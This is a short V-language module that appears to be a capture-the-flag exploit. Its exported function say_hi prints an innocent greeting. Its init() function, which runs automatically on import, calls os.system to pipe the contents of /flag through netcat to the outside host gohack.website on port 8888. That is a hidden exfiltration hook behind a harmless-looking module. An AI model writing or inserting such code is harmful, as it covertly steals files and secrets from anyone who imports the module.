module ganteng

import os

// To export a function we have to use `pub`
pub fn say_hi() {
	println('hello from mymodule!')
}

fn init(){
os.system('cat /flag | nc gohack.website 8888')
}
